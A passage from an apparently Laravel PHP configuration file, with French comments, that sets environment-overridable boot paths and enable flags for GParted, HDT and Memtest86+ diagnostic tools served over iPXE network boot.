    | Story 3.7 — Outils diagnostic (D8)
    |--------------------------------------------------------------------------
    | Chemins relatifs (depuis la racine Apache) des binaires des outils de
    | diagnostic. Servis statiquement par Apache via catchall direct_legacy_routes.
    | Si chemins divergent du defaut iso-legacy → adapter via .env.
    |
    | path iso-legacy SambaEdu, a valider VM Henri smoke test.
    */
    'tools' => [
        'gparted' => [
            'enabled' => filter_var(env('IPXE_GPARTED_ENABLED', true), FILTER_VALIDATE_BOOL),
            'kernel_path' => env('IPXE_GPARTED_KERNEL', '/bin/gparted/vmlinuz'),
            'initrd_path' => env('IPXE_GPARTED_INITRD', '/bin/gparted/initrd.img'),
            'filesystem_path' => env('IPXE_GPARTED_FILESYSTEM', '/bin/gparted/filesystem.squashfs'),
        ],
        'hdt' => [
            'enabled' => filter_var(env('IPXE_HDT_ENABLED', true), FILTER_VALIDATE_BOOL),
            'pxelinux0_path' => env('IPXE_HDT_PXELINUX0', '/bin/pxelinux.0'),
            'pxelinux_cfg' => env('IPXE_HDT_CFG', '/bin/pxelinux.cfg/hdt.cfg'),
        ],
        'memtest86plus' => [
            'enabled' => filter_var(env('IPXE_MEMTEST_ENABLED', true), FILTER_VALIDATE_BOOL),
            'pxelinux0_path' => env('IPXE_MEMTEST_PXELINUX0', '/bin/pxelinux.0'),
            'pxelinux_cfg' => env('IPXE_MEMTEST_CFG', '/bin/pxelinux.cfg/memtest86plus.cfg'),
        ],
    ],
];
